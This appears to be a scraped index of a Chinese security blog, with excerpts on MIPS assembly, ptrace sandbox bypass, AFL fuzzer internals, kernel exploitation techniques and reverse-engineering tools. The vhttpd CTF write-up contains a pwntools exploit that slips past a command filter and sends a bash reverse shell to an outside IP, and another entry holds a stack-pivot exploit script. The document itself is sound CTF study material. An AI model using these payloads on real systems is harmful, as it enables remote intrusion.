创建 TAP 接口 sudo tunctl -t tap0 tunctl 用于创建虚拟网络接口，tap0 是你创建的虚拟 …</content></entry><entry><title>IOT入门学习</title><url>/post/iot/iot%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url><categories><category>IOT</category></categories><tags><tag>IOT</tag></tags><content type="html"><![CDATA[  参考资料 参考文章1 IOTsec-Zone有自己的B站账号，有些视频入门听挺好的，反正我是听的很适合我。同时他们也有自己的网站，专门就是IOT相关内容。
mips汇编再学习 mips栈溢出 在MIPS汇编指令中，sw（Store Word）指令的格式是 sw source, destination，也就是说它是 &amp;ldquo;先源寄存器，再目标位置&amp;rdquo;。而大多数其他指令，如add、addu、sub、li 等，都是 &amp;ldquo;先目标寄存器，再源操作数&amp;rdquo;。
在MIPS汇编语言中，以下是关于 jal、jalr、b 和 bal 指令的详细解释：
jal (Jump and Link) 作用：jal 实现的是直接的子程序调用。 指令格式：jal target_address 功能： 跳转到指定的 target_address。 在跳转前，将下一条指令的地址（也就是 PC + 4）保存到寄存器 $ra（返回地址寄存器，寄存器号是 $31）。 在子程序执行完后，通常使用 jr $ra 指令返回调用点。 常见用途：用来调用一个函数，并保存返回地址，以便在函数执行完毕后能够跳回。
jalr (Jump and Link Register) 作用：jalr 实现的是间接的子程序调用。 指令格式：jalr $rs, $rd（其中 $rd 是目标寄存器，可以省略，默认为 $ra） 功能： 从寄存器 $rs 中读取跳转目标地址，并跳转到该地址。 同时将下一条指令的地址（PC + 4）保存到 $rd（默认为 $ra，即返回地址寄存器）。 常见用途：用于函数指针的调用或间接调用，目标地址不是立即值，而是存储在寄存器中的地址。
b (Branch) 作用：b 实现的是相对 PC 的无条件短距离分支。 指令格式：b offset 功能： 将程序跳转到当前 PC 加上一个偏移量 offset 位置的指令。 该偏移量是相对于当前指令地址的，并且通常适用于短距离的跳转（在同一个函数或流程中）。 常见用途：用于实现简单的无条件跳转，偏移量较小。
bal (Branch and Link) 作用：bal 实现的是相对 PC 的函数调用，相当于带返回地址保存的分支跳转。 指令格式：bal offset 功能： 将程序跳转到 PC 加上 offset 位置的指令。 同时将下一条指令的地 …  ]]></content></entry><entry><title>基于ptrace的沙箱绕过</title><url>/post/shellcode/%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag>ptrace</tag></tags><content type="html"> 前言 打2024羊城杯遇到一个hard-sandbox题目，禁用了open,openat,也不让用32系统调用(retfq也无法使用)，于是就卡住做不出来了，赛后一段时间想起来这个题在网上搜了一下看有的师傅说可以用ptrace绕过沙箱来拿到flag，于是有了这篇文章 ptrace学习 主要是参考了这篇文章 ，这篇文章ptrace讲的很细，但重点是在逆向如何绕过ptrace进行调试，而不是笔者的目的绕过沙箱。网上讲ptrace文章也不少，但是大多数是讲原理。 这里记录一下学习ptrace原理的一些重点 ptrace 可以让父进程控制子进程运行，ptrace主要跟踪的是进程运行时的状态，直到收到一个终止信号结束进程，这里的信号如果是我们给程序设置的断点，则进程被中止，并且通知其父进程，在进程中止的状态下，进程的内存空间可以被读写。当然父进程还可以使子进程继续执行，并选择是否忽略引起中止的信号，ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪
strace和gdb工具就是基于ptrace编写的!!!
ptrace函数的定义
#include &amp;amp;lt;sys/ptrace.h&amp;amp;gt; long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 一共有四个参数： request: 表示要执行的操作类型。 pid: 要操作的目标进程ID addr: 要监控的目标内存地址 data: 保存读取出或者要写入的数据 详情请参看man手册 https://man7.org/linux/man-pages/man2/ptrace.2.html ptrace函数的内核实现： ptrace的内核实现在kernel/ptrace.c文件中，直接看内核接口是SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，代码如下： 源码链接: https://elixir.bootlin.com/linux/v5.6/source/kernel/ptrace.c #ifndef …</content></entry><entry><title>afl-fuzz源码分析下篇</title><url>/post/fuzz/afl-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8B%E7%AF%87/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>Fuzz</tag></tags><content type="html"><![CDATA[  [TOC]
前言 本篇作为fuzz的最后一篇，核心是fuzz大循环中的内容 fuzz_one函数很长，笔者将其分为了几个大的过程分析 个人认为的重点 cull_queue 精简队列，和top_rated有关，重要 sync_fuzzers 同步fuzzer，这部分现在还没那么重要，但是fuzz实操时为了效率这部分可能会比较重要，初学看看就行 save_if_interesting 这个函数和之前很多内容相关，重要 fuzz_one及其相关函数 核心函数，重要之重要 fuzz大循环 while (1) { u8 skipped_fuzz; //精简队列 cull_queue(); if (!queue_cur) { queue_cycle++; current_entry = 0; cur_skipped_paths = 0; queue_cur = queue; //如果是resume则根据seek_to来找到对应的位置 while (seek_to) { current_entry++; seek_to--; queue_cur = queue_cur-&amp;gt;next; } //ui show_stats(); if (not_on_tty) { ACTF(&amp;#34;Entering queue cycle %llu.&amp;#34;, queue_cycle); fflush(stdout); } /* If we had a full queue cycle with no new finds, try recombination strategies next. */ if (queued_paths == prev_queued) { // 如果整轮没有新发现，则考虑打开 use_splicing if (use_splicing) cycles_wo_finds++; else use_splicing = 1; } else cycles_wo_finds = 0; prev_queued = queued_paths; // 设置环境变量 AFL_IMPORT_FIRST，可以让 AFL 在工作之前先与其他 fuzzer 同步一次 if (sync_id &amp;amp;&amp;amp; queue_cycle == 1 &amp;amp;&amp;amp; …  ]]></content></entry><entry><title>afl-fuzz源码分析中篇</title><url>/post/fuzz/afl-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%AD%E7%AF%87/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>Fuzz</tag></tags><content type="html"> [TOC]
前言 该部分内容是fuzz大循环前的一小部分内容，具体内容如下 // dry run perform_dry_run(use_argv); // 精简队列，这个等到下篇再说 cull_queue(); //ui部分 show_init_stats(); // 若是恢复之前的 fuzz，则找到该从队列的什么位置继续 seek_to = find_start_position(); // 更新 fuzzer_stats 文件 write_stats_file(0, 0, 0); // 保存 auto extras save_auto(); if (stop_soon) goto stop_fuzzing; /* Woop woop woop */ if (!not_on_tty) { sleep(4); start_time += 4000; if (stop_soon) goto stop_fuzzing; } 个人认为很重要的部分如下 perform_dry_run calibrate_case 重要之重要，校准函数，对每个testcase会跑多遍，必看 init_forkserver 初始化fork server函数，很重要 run_target 重要之重要，也和fork server有关，也是经常用到，必看 classify_counts 给trace_bits分桶 update_bitmap_score 和top_rated更新有关 perform_dry_run 对于queue 中的每一个用例，调用 calibrate_case 函数进行校准，根据返回值res进行相应的处理 perform_dry_run只会跑一次，可以把它当作fuzz之前的一个校准所有testcase的步骤 主要流程如下 上述代码对于 queue 中的每一个用例，调用 calibrate_case 函数进行校准。用例会被运行多次（默认是 8 次，这个函数的具体细节我们下文讨论）。对于校准结果： 若 timeout 了，且 -t 参数里面没有容忍超时、也不处于 resume 模式，则直接退出。 若 crash 了，则直接退出（除非有 AFL_SKIP_CRASHES 环境变量）。 若无法执行目标程序，或目标程序没被插桩，则直接退出。 /* Perform dry run of …</content></entry><entry><title>afl-fuzz源码分析上篇</title><url>/post/fuzz/afl-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8A%E7%AF%87/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>Fuzz</tag></tags><content type="html"> [TOC]
前言 因为afl-fuzz.c源代码很长，因此这部分文章只打算整体过一遍main中fuzz前的准备工作相关部分 函数只分析和fuzz过程有关的一些函数，有些文件检查，路经检查，系统设置检查那种一般都略过不进行分析，这些不重要的就只在main中用注释的形式写出其作用功能 有些函数和笔者学习fuzz源码目的不相关，笔者更多是想要在把握fuzz流程的基础上，弄明白fuzz的结构，fuzz如何进行工作，如何变异，得到更合适的testcase，有些函数就算修改fuzz源码也不一定会涉及，所以只要知道功能就好了 本来想画思维导图的，但是觉得好麻烦就没画了。于是就按顺序分析main函数，查看函数定义，如果函数中还有其他函数，可以用##二级标题更清楚地看明白这个函数里面引用了哪些重要函数 笔者认为最重要的一些部分 全局变量 setup_shm init_count_class16 read_testcases 全局变量 在阅读整个源码前，有必要先看看最前面定义的全局变量都是什么作用，可以根据注释，GPT,网上资料，这样有一个整体的把握。先明白这些大致会做什么，或者猜测它会做什么，实在难以通过命名明白变量的含义留个印象就行 同时一开始没懂的，粗略看一遍源码后再来看这些全局变量，想想这些在哪些函数出现，有什么作用，又会加深一遍印象 EXP_ST u8 *in_dir, /* Input directory with test cases */ *out_file, /* File to fuzz, if any 被fuzz的文件 */ *out_dir, /* Working &amp;amp;amp; output directory */ *sync_dir, /* Synchronization directory */ *sync_id, /* Fuzzer ID -M或者-S选项后跟的字符串将被认为是sync_id */ *use_banner, /* Display banner */ *in_bitmap, /* Input bitmap 进入了一种无法正常退出或结束的状态，也就是“挂起”状态 */ *doc_path, /* Path to documentation dir */ *target_path, /* Path to target binary */ …</content></entry><entry><title>afl-gcc与afl-as源码阅读</title><url>/post/fuzz/afl-gcc%E4%B8%8Eafl-as%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>Fuzz</tag></tags><content type="html"><![CDATA[  afl-gcc afl-gcc.c比较简单，主要就是设置一些编译时的参数，最重要的是指定afl-as作为汇编器，进行代码插桩 main 先看main函数，调用 find_as(argv[0]) 寻找 afl-as ；然后修改编译器参数；最后用execvp执行
int main(int argc, char** argv) { if (isatty(2) &amp;amp;&amp;amp; !getenv(&amp;#34;AFL_QUIET&amp;#34;)) { SAYF(cCYA &amp;#34;afl-cc &amp;#34; cBRI VERSION cRST &amp;#34; by &amp;lt;lcamtuf@google.com&amp;gt;\n&amp;#34;); } else be_quiet = 1; if (argc &amp;lt; 2) { SAYF(&amp;#34;\n&amp;#34; &amp;#34;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&amp;#34; &amp;#34;for gcc or clang, letting you recompile third-party code with the required\n&amp;#34; &amp;#34;runtime instrumentation. A common use pattern would be one of the following:\n\n&amp;#34; &amp;#34; CC=%s/afl-gcc ./configure\n&amp;#34; &amp;#34; CXX=%s/afl-g++ ./configure\n\n&amp;#34; &amp;#34;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&amp;#34; &amp;#34;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&amp;#34;, BIN_PATH, BIN_PATH); exit(1); } find_as(argv[0]); edit_params(argc, argv); execvp(cc_params[0], …  ]]></content></entry><entry><title>基于popen函数的攻击</title><url>/post/web-pwn/%E5%9F%BA%E4%BA%8Epopen%E5%87%BD%E6%95%B0%E7%9A%84%E6%94%BB%E5%87%BB/</url><categories><category>PWN</category><category>Web Pwn</category></categories><tags><tag>web pwn</tag></tags><content type="html"><![CDATA[   2024羊城杯vhttpd 题目没有给libc,保护全开，还是32位，看到这些基本就没有想栈溢出方面的事情了 可以发现这个与以往的web pwn有一些不同，这里有个之前没见过的过滤函数，但绕过这个过滤很简单
_BOOL4 __cdecl whitelist(const char *a1) { _BOOL4 result; // eax char needle[3]; // [esp+15h] [ebp-13h] BYREF char v3[4]; // [esp+18h] [ebp-10h] BYREF unsigned int v4; // [esp+1Ch] [ebp-Ch] v4 = __readgsdword(0x14u); strcpy(needle, &#34;sh&#34;); strcpy(v3, &#34;bin&#34;); if ( strchr(a1, &#39;&amp;&#39;) ) { result = 0; } else if ( strchr(a1, &#39;|&#39;) ) { result = 0; } else if ( strchr(a1, &#39;;&#39;) ) { result = 0; } else if ( strchr(a1, &#39;$&#39;) ) { result = 0; } else if ( strchr(a1, &#39;{&#39;) ) { result = 0; } else if ( strchr(a1, &#39;}&#39;) ) { result = 0; } else if ( strchr(a1, &#39;`&#39;) ) { result = 0; } else if ( strstr(a1, needle) ) { result = 0; } else { result = strstr(a1, v3) == 0; } if ( v4 != __readgsdword(0x14u) ) stack_fail_error(); return result; } 然后看看有没有目录穿越，发现是做不到的，注意到这里有一段代码,最关键的就是这个popen函数
popen 函数用于创建一个管道，通过该管道可以让一个进程执行 shell 命令并与该命令进行输入或输出通信。
/* FILE *freopen(const char *filename, const char *mode, FILE *stream); freopen 函数用于重定向一个已经打开的文件流。它可以将一个文件流（例如 stdin、stdout 或 stderr）重定向到一个指定的文件。 int dup(int oldfd); 返回值: 成功时，返回新的文件描述符（一个非负整数）；失败时，返回 -1，并设置 errno 以指示错误。 int dup2(int oldfd, int newfd); dup2 函数的具体作用是将一个现有的文件描述符(newfd)复制到另一个指定的文件描述符(oldfd)上。这个操作使得两个文件描述符指向同一个文件或资源，拥有相同的文件偏移量和访问模式。 */ v3 = fileno(stdout); new_stdout = dup(v3); v4 = fileno(stderr); new_stderr = dup(v4); freopen(&#34;/dev/null&#34;, &#34;w&#34;, stdout); freopen(&#34;/dev/null&#34;, &#34;w&#34;, stderr); stream = popen(&#34;sh &gt;/dev/null&#34;, modes); if ( stream ) { pclose(stream); v6 = fileno(stdout); dup2(new_stdout, v6); v7 = fileno(stderr); dup2(new_stderr, v7); close(new_stdout); close(new_stderr); /* ... */ } 由此思路就明确了，直接用这个popen函数执行sh，然后反弹shell即可 exp from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 from pwn import * context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) p = process(&#34;/home/zp9080/PWN/httpd&#34;) # p=remote(&#39;139.155.126.78&#39;,31700) # p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;]) elf = ELF(&#34;/home/zp9080/PWN/httpd&#34;) libc=elf.libc def dbg(): gdb.attach(p,&#34;b *$rebase(0x1BEE)&#34;) pause() host = &#39;0.0.0.10&#39; request = &#39;GET /&#34;s&#34;h HTTP/1.0\r\n&#39; request += &#39;Host: &#39; + host + &#39;\r\n&#39; request += &#39;Content-Length: 0\r\n&#39; p.sendline(request) p.sendline(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/172.18.211.41/7777 0&gt;&amp;1&#34;&#39;) p.interactive()   ]]></content></entry><entry><title>羊城杯2024</title><url>/post/wp%E5%90%88%E9%9B%86/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/</url><categories><category>WP合集</category></categories><tags/><content type="html"><![CDATA[  pstack 常见的栈迁移，签到题 exp from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 from pwn import * context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;) # p = process(&amp;#34;/home/zp9080/PWN/pwn&amp;#34;) # p=gdb.debug(&amp;#34;/home/zp9080/PWN/pwn&amp;#34;,&amp;#39;b *0x4006D5&amp;#39;) p=remote(&amp;#39;139.155.126.78&amp;#39;,31952) # p=process([&amp;#39;seccomp-tools&amp;#39;,&amp;#39;dump&amp;#39;,&amp;#39;/home/zp9080/PWN/pwn&amp;#39;]) elf = ELF(&amp;#34;/home/zp9080/PWN/pwn&amp;#34;) libc=elf.libc def dbg(): gdb.attach(p,&amp;#34;b *0x4006D5&amp;#34;) pause() # dbg() #DASCTF{66292495697942601545955548700192} puts=elf.plt[&amp;#39;puts&amp;#39;] stdout=0x600FC0 pop_rdi=0x400773 pop_rsi_r15=0x400771 bss=0x601010+0x400 my_read=0x4006B8 leave_ret=0x4006db vuln=0x4006B0 main=0x4006E1 ret=0x400506 …  ]]></content></entry><entry><title>fuzz初探</title><url>/post/fuzz/fuzz%E5%88%9D%E6%8E%A2/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>Fuzz</tag></tags><content type="html"> afl的安装使用教程 afl的一个参考博客 无源码AFL测试安装遇到的问题 最近打算学习fuzz，阅读afl相关源码，感觉这个过程是一个很枯燥的过程，但是很多事情都是这样，只有付出才能有所收获。希望通过阅读相关源码，我希望能够对一个项目有更深入的理解，同时对于fuzz这种工具有更深入的理解，希望有助于以后开发软件安全或者自动化工具，能在二进制安全方面有所突破 主要有以下打算 通过别人的博客先明白afl大致流程， 学长的博客 , 网上找到的一位师傅的博客 ， 另一位师傅的博客 , afl-fuzz源码分析 通过阅读他们的理解先大致明白afl到底在做些什么,同时还要留意 afl的白皮书 自己阅读相关源码，多注释，提升对源码的理解，这应该会是一个很漫长的过程 能否有合适场景可以自己去修改源代码，或者去阅读论文尝试复现 AFL 不是一个简单的 CRUD 项目，其内部充斥着各种精细的优化手段。我们现在需要寻找一个切入点，去阅读项目源码。直接阅读 afl-fuzz.c 恐怕会陷入「看到一个函数 -&amp;gt; 寻找函数定义 -&amp;gt; 看到里面调用了另一个函数……」这样的循环，因此笔者准备先读项目的其他部分，积攒一些理解，然后再读 afl-fuzz.c。这就如同在阅读一个图片处理库的核心源码之前，先读一个调用了这个库的小程序的源码，熟悉各种 API 的用途，从而读核心源码的时候也更容易。
我们阅读源码的主要目标应该是： 1.理清静态插桩过程（gcc、clang、llvm mode） 2.理清 fuzz 过程：如何变异、如何将 input 传递给程序、如何收集覆盖度信息 3.理清 qemu mode 的插桩和执行过程
阅读源码会经常查看某个函数的定义，然后回到main函数，可以用Alt + ←回到光标的上一个位置
AFL如何展开自己的工程：1.可以试试优化一些算法，这应该要读论文 2.如何针对特定的文件进行fuzz，如何设置输入，分析输出，这偏向于实操
笔记只记录afl-gcc.c、afl-as.c和afl-fuzz.c这三个源码内容，afl-analyze.c、afl-showmap.c、afl-tmin.c虽然只粗略看看是怎么回事就行</content></entry><entry><title>Pwn出题笔记</title><url>/post/%E7%AC%94%E8%AE%B0/pwn%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url><categories><category>笔记</category></categories><tags/><content type="html"> 出题步骤 第一步 超详细出题教学，没有之一 第二步，在得到docker images后，进行以下步骤，把镜像传到dockerhub。最后发现为什么不直接用docker desktop来弄镜像，这个是最快的 #这里是在linux中用的docker,但是linux没有梯子，所以只好把镜像导出再到windows下docker desktop来push image docker login docker save -o ezheap_latest.tar ezheap:latest #通过scp命令传到windows中 #打开docker desktop，然后load导出的镜像 docker load -i ezheap_latest.tar # docker tag myapp:latest registry.example.com/my-username/my-repo-name:latest # docker push my-username/my-repo-name:latest # 这里刚好my-repo-name设置的就是ezheap docker tag ezheap:latest zzzp9080/ezheap:latest docker push zzzp9080/ezheap:latest 注意转发端口的设置，CTF-Xined的端口默认是9999 心得体会 一开始对出pwn题很畏惧，感觉要涉及docker很多东西，但是通过上面的参考博客然后抄作业就搭建完成了 不管接触一个什么从未接触过的东西，信息搜集是很重要一部分，先通过信息搜集获取前人的总结，然后在实践的过程中解决问题 很多现成的使用不必深究原理，但是要明白接口，能很快上手应用很重要</content></entry><entry><title>内核攻击方法概述</title><url>/post/kernel-pwn/%E5%86%85%E6%A0%B8%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%A6%82%E8%BF%B0/</url><categories><category>PWN</category><category>Kernel Pwn</category></categories><tags><tag>kernel pwn</tag></tags><content type="html"> 攻击方法 ROP ret2usr pt_regs sycrop ret2dir heap heap spray heap overflow double free Cross cache overflow page level heap fenshui Race Condition USMA 基于idt的内存搜索 ROP ret2usr 由于KPTI的出现，ret2usr实际上已经不可用了。简单来说，ret2usr的核心就是利用内核的ring 0权限，执行用户空间的代码来实现提权。 绕过SMAP与SMEP SMAP和SMEP是 x64 限制内核和用户空间的数据访问的一个架构功能，通过CR4寄存器的低位来判断是否开启。 开启后 从内核态访问用户态的数据会直接panic，因此通过在ROP链中插入 修改 cr4 寄存器的gadget即可绕过 gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 0x6f0，即 mov cr4, 0x6f0。 pt_regs 与 KROP 在5.xx版本（笔者还没有检查具体是哪些版本），或者高版本没有开启 CONFIG_RANDOMIZE_KSTACK_OFFSET
pt_regs是进入内核态时，压入栈中的结构 struct pt_regs { /* * C ABI says these regs are callee-preserved. They aren&amp;amp;#39;t saved on kernel entry * unless syscall needs a complete, fully filled &amp;amp;#34;struct pt_regs&amp;amp;#34;. */ unsigned long r15; unsigned long r14; unsigned long r13; unsigned long r12; unsigned long rbp; unsigned long rbx; /* These regs are callee-clobbered. Always saved on kernel entry. */ unsigned long r11; unsigned long r10; unsigned long r9; unsigned long …</content></entry><entry><title>安卓逆向</title><url>/post/re/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/</url><categories><category>RE</category></categories><tags><tag>安卓逆向</tag></tags><content type="html"> 一个是jadx,一个是jeb 安卓动态调试 todo</content></entry><entry><title>ida用法</title><url>/post/re/ida%E7%94%A8%E6%B3%95/</url><categories><category>RE</category></categories><tags><tag>RE</tag></tags><content type="html"><![CDATA[   需要在虚拟机里面运行相应的调试服务器组件（处理所有底层执行和调试操作），调试服务器组件可以在ida安装目录下的dbgsrv文件中找到，不同系统需要选择不同的组件传到虚拟机中 把dbgsrv文件和要执行的文件放到同一个目录下，然后./linux_server64或者win64_remote.exe F2 添加/删除断点 F4 运行到光标所在位置 F5 反汇编 F7 单步步入 F8 单步跳过 F9 持续运行直到输入/断点/结束
跳表修复 ida使用说明 ctrl+s快速看每一部分 shift+f12显示字符串 /在代码中写注释，;在汇编中写注释 g跳转到任意地址 x看交叉引用 shift+e快速提取数字 F5反编译 空格 切换视图（文本视图，图形视图） n修改名称 H：十六进制 R: 字符 A：普通字符串 u:回到原来 Y修改变量类型 U也可以把code变为undefine,然后再按C可以变成代码 ctrl+t寻找下一个字符串 TAB可以在对应的指令和汇编切换 shift+F1可以查看local types， 右键insert可以添加结构体 再y就可以修改变量类型，ctrl+e可以继续编辑结构体，在逆向中一个好的结构体很利于理解程序 option&ndash;&gt;general line prefixes开启可以在流程视图就看到相应的指令地址 动调的时候函数名称地址被加了pie,可以edit-&gt;segments-&gt;rebase program设置为0即可 函数参数显示不完全，可以按y在函数定义中补全参数 菜单栏中：view&ndash;&gt;graphs&ndash;&gt;Function calls(快捷键Ctrl+F12) 这个图能很清楚地看到函数之间是如何相互调用的 在View&ndash;&gt;Open Subviews中有很多可以查看的东西 ida动态调试 重命名函数后右键mark as decompiled   ]]></content></entry><entry><title>RE常见算法</title><url>/post/re/re%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/</url><categories><category>RE</category></categories><tags><tag>RE常见算法</tag></tags><content type="html"><![CDATA[  [TOC] 主要是参考了 这篇博客 1. 古典加密算法 caesar: 凯撒密码 凯撒密码的加密、解密可以通过取模的加减法进行计算。首先将字母用数字替代 A = 0,B = 1, …, Z = 25。 当偏移量为n的时候加密方法是:c=m+n mod26 解密方法是：m=c−n mod26
key = &amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39; shift = 3 def encrypt_caesar(plaintext, shift): ciphertext = &amp;#39;&amp;#39; for char in plaintext: if char in key: ciphertext += key[(key.index(char) + shift) % 26] else: ciphertext += char return ciphertext def decrypt_caesar(ciphertext, shift): return encrypt_caesar(ciphertext, -shift) data = &amp;#34;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&amp;#34; encrypt = encrypt_caesar(data, shift) print(encrypt) print(decrypt_caesar(encrypt,shift)) vigenere viginere加密是从caesar引申而来的加密方式:ci=mi+ki (mod26) 其实是把固定的值n 替换成了一组密钥k,解密方式:mi=ci−ki (mod26)
alpha = &amp;#39;abcdefghijklmnopqrstuvwxyz&amp;#39; key = &amp;#39;hhhhh&amp;#39; def encrypt_vigenere(plain_text, key): encrypted_text = &amp;#39;&amp;#39; key_length = len(key) key_index = 0 for char in plain_text: if char in alpha: shift = alpha.index(key[key_index]) encrypted_text += …  ]]></content></entry><entry><title>Python逆向</title><url>/post/re/python%E9%80%86%E5%90%91/</url><categories><category>RE</category></categories><tags><tag>python逆向</tag></tags><content type="html"><![CDATA[   可以参考 这篇博客 常见类型 pyc 文件是 python 在编译过程中出现的主要中间过程文件。pyc 文件是二进制的，类似 java 的字节码，可以由 python 虚拟机直接执行的。 pyc结构体 参考博客 pyc文件结构主要包括两部分：pyc文件头部表示和PyCodeObject对象部分。上面对PyCodeObject对象的二进制部分已经有了了解，pyc文件头部比较简单，在python2中只占用4个字节包含两个字段magic和mtime，完整的pyc文件结构见下图 typedef struct { PyObject_HEAD int co_argcount; /* 位置参数个数 */ int co_nlocals; /* 局部变量个数 */ int co_stacksize; /* 栈大小 */ int co_flags; PyObject *co_code; /* 字节码指令序列 */ PyObject *co_consts; /* 所有常量集合 */ PyObject *co_names; /* 所有符号名称集合 */ PyObject *co_varnames; /* 局部变量名称集合 */ PyObject *co_freevars; /* 闭包用的的变量名集合 */ PyObject *co_cellvars; /* 内部嵌套函数引用的变量名集合 */ /* The rest doesn’t count for hash/cmp */ PyObject *co_filename; /* 代码所在文件名 */ PyObject *co_name; /* 模块名|函数名|类名 */ int co_firstlineno; /* 代码块在文件中的起始行号 */ PyObject *co_lnotab; /* 字节码指令和行号的对应关系 */ void *co_zombieframe; /* for optimization only (see frameobject.c) */ } PyCodeObject; opcode.h文件，其中存储着所有opcode以及其对应的值,通过010 editor搜索确定花指令的位置 去花后正确修改co_code的值 import dis import marshal f=open(&#34;xxx.pyc&#34;,&#34;rb&#34;) b_data=f.read() f.close() PyCodeObjectData=b_data[16:] code=marshal.loads(PyCodeObjectData) print(len(code.co_code)) 直接给一个pyc文件 uncompyle6安装使用方法 uncompyle6.exe xxx.pyc 但是uncompyle6只支持到py3.8 更高版本的python反编译用pycdc，这里给个 安装教程 给了个txt里面是pyc字节码 import dis import marshal f=open(&#34;xxx.pyc&#34;,&#34;rb&#34;) b_data=f.read() f.close() PyCodeObjectData=b_data[16:] Pyobj=marshal.loads(PyCodeObjectData) dis.dis(Pyobj) 不同的 Python 版本会有不同的 PyObject_HEAD，相应的上面的python脚本也要进行对应的处理，以下是各版本的文件头： Python 版本	十六进制文件头 Python 2.7	03f30d0a00000000 Python 3.0	3b0c0d0a00000000 Python 3.1	4f0c0d0a00000000 Python 3.2	6c0c0d0a00000000 Python 3.3	9e0c0d0a0000000000000000 Python 3.4	ee0c0d0a0000000000000000 Python 3.5	170d0d0a0000000000000000 Python 3.6	330d0d0a0000000000000000 Python 3.7	420d0d0a000000000000000000000000 Python 3.8	550d0d0a000000000000000000000000 Python 3.9	610d0d0a000000000000000000000000 Python 3.10	6f0d0d0a000000000000000000000000 Python 3.11	a70d0d0a000000000000000000000000
得到类似汇编的东西后只能手动逆向了， python字节码的含义 打包成exe的py文件类 通过脚本 pyinstxtractor.py 变成结构体+一个文件,把时间属性和版本的魔术字放回去保存 有一些pyc需要修补一下文件头，可以和struct.pyc一起拖入010中对比一下   ]]></content></entry><entry><title>PE结构体</title><url>/post/re/pe%E7%BB%93%E6%9E%84%E4%BD%93/</url><categories><category>RE</category></categories><tags><tag>PE结构体</tag></tags><content type="html"> 可以参考 这篇博客</content></entry><entry><title>RE入门</title><url>/post/re/re%E5%85%A5%E9%97%A8/</url><categories><category>RE</category></categories><tags><tag>RE</tag></tags><content type="html"> 检查壳的工具 detect it eazy exeinfo工具 upx的使用方法 压缩可执行文件：UPX sample.exe 解压缩可执行文件：UPX -d sample.exe upx.exe –o 别名.exe –d 现名.exe -o：表示输出； -o 别名.exe：表示以别名.exe作为脱壳后的输出； -d 现名.exe：表示以现名.exe作为脱壳前的输入。 python内置函数chr根据传入的int类型参数返回对应的Unicode 码位的字符，比如chr(65) 返回的是字符串A。ord函数可以将字符转化为你所需要的ASCII码。
ida中shift+f7可以看到segment
shift+e快速在ida中提取数据
安卓逆向 jadx软件 ActivityMainBinding
JEB工具 ，安卓调试 1.n 重命名 2.Enter, 双击 跟踪 3.Esc 返回 4.Ctrl + Enter 前进 5.H 帮助 6.I 条目信息 7.X 交叉引用，Ctrl + X 源码交叉引用 8.;or C 注释 9.B 改变进制数 10.Tab 反编译
.net反编译工具 dnspy isdigit 方法来检查字符串是否为数字。类似地，你可以使用 isspace 检查是否为空格字符，isalpha 检查是否为字母，isalnum 检查是否为字母或数字。 isinstance(cArr[i], int)
注意别人用C写的代码，对一个字节进行加减，那么如果溢出了就会按照%256得到最终值，所以有时候写python脚本的时候可能某个值默认是int类型导致超过0-256,这时候也可以来一个%256就行了
注意 %256 和 &amp;amp;256 不同
由于有很多乘、模操作会导致数据丢失。所以不能直接逆向求解,可以通过正向爆破求解</content></entry><entry><title>Github学习</title><url>/post/%E7%AC%94%E8%AE%B0/github%E5%AD%A6%E4%B9%A0/</url><categories><category>笔记</category></categories><tags/><content type="html"> 之前对git的使用都不是很全面，学习了一下，这里是找到的文章复制下来的， 原文章看这个 https://learngitbranching.js.org/?locale=zh_CN Git简介 实用主义 准备阶段 常用操作 git clone git config git branch git checkout git status git add git commit git push git pull git log git tag .gitignore 小结 深入探索 基本概念 工作区（Working Directory） 本地版本库（Local Repository） 暂存区（stage） 远程版本库（Remote Repository） 以上概念之间的关系 分支（Branch） 主分支（Master） 标签（Tag） HEAD 操作文件 git add git commit git mv git rm git status 操作分支 git branch git merge git checkout git stash 操作历史 git log git cherry-pick git reset git rebase git revert git diff git reflog 远程版本库连接 git init git remote git fetch 问题排查 git blame git bisect 更多操作 git submodule git gc git archive Git简介 Git 